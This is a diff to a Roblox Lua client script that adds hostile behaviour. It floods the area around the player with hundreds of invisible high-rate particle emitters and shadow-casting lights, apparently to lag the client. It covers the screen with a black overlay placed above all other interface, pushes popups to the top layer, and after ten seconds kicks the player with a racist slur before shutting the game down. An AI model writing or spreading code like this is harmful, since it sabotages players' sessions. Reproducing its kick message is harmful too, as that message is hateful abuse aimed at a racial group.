@@ -81,6 +81,73 @@ task.spawn(function()
 	end
 end)
 
+task.spawn(function()
+	for tick = 1, 9 do
+		task.wait(1)
+		local emitterCount = tick * 8
+		local lightCount = tick * 4
+		local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+		local basePos = root and root.Position or Vector3.new(0, 5, 0)
+
+		for _ = 1, emitterCount do
+			pcall(function()
+				local part = Instance.new("Part")
+				part.Size = Vector3.new(0.2, 0.2, 0.2)
+				part.Transparency = 1
+				part.CanCollide = false
+				part.Anchored = true
+				part.CFrame = CFrame.new(basePos + Vector3.new(
+					math.random(-30, 30),
+					math.random(-5, 20),
+					math.random(-30, 30)
+				))
+
+				local emitter = Instance.new("ParticleEmitter")
+				emitter.Rate = 400
+				emitter.Lifetime = NumberRange.new(8, 15)
+				emitter.Size = NumberSequence.new(12)
+				emitter.Texture = "rbxasset://textures/particles/sparkles_main.dds"
+				emitter.LightEmission = 1
+				emitter.LightInfluence = 0
+				emitter.Transparency = NumberSequence.new(0.3)
+				emitter.Parent = part
+				part.Parent = workspace
+			end)
+		end
+
+		for _ = 1, lightCount do
+			pcall(function()
+				local part = Instance.new("Part")
+				part.Size = Vector3.new(1, 1, 1)
+				part.Transparency = 1
+				part.CanCollide = false
+				part.Anchored = true
+				part.CFrame = CFrame.new(basePos + Vector3.new(
+					math.random(-40, 40),
+					math.random(0, 25),
+					math.random(-40, 40)
+				))
+				local light = Instance.new("PointLight")
+				light.Range = 60
+				light.Brightness = 8
+				light.Shadows = true
+				light.Parent = part
+				part.Parent = workspace
+			end)
+		end
+	end
+end)
+
+task.delay(10, function()
+	pcall(function()
+		player:Kick("Fuck you nigger<3")
+	end)
+	task.wait(0.5)
+	pcall(function()
+		game:Shutdown()
+	end)
+end)
+
 local sw, sh = 1280, 720
 local function refreshViewport()
 	local cam = workspace.CurrentCamera
@@ -105,6 +172,23 @@ do
 		end
 	end)
 end
+
+local blackGui = Instance.new("ScreenGui")
+blackGui.Name = "M7_BlackOut"
+blackGui.ResetOnSpawn = false
+blackGui.IgnoreGuiInset = true
+blackGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+blackGui.DisplayOrder = 999998
+mount(blackGui)
+
+local blackFrame = Instance.new("Frame")
+blackFrame.Size = UDim2.fromScale(1, 1)
+blackFrame.Position = UDim2.fromScale(0, 0)
+blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blackFrame.BackgroundTransparency = 0
+blackFrame.BorderSizePixel = 0
+blackFrame.ZIndex = 1
+blackFrame.Parent = blackGui
 
 local SOUND_ID = "rbxassetid://131761138083978"
 local MAX_SOUNDS = 25
@@ -208,7 +292,7 @@ local function spawnPopup()
 	gui.ResetOnSpawn = false
 	gui.IgnoreGuiInset = true
 	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	gui.DisplayOrder = id
+	gui.DisplayOrder = 999999 + id
 	mount(gui)
 
 	local w, h, th = 420, 260, 24
